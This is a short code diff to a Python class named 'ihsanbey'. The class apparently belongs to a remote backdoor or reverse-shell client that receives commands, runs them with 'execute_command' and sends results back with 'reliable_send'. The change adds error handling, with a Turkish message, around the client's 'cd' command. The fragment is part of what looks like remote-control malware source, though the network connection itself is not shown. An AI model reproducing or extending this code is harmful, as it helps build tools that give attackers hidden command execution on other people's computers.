@@ -55,8 +55,11 @@ class ihsanbey:
 
             elif command.startswith("cd "):
                 path = " ".join(command.split(" ")[1:])
-                command_result =  self.change_dir(path)
-                self.reliable_send(command_result)
+                try: 
+                    command_result =  self.change_dir(path)
+                    self.reliable_send(command_result)
+                except FileNotFoundError:
+                    return print("Eksik dosya ismi / dosya bulunamadı")
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
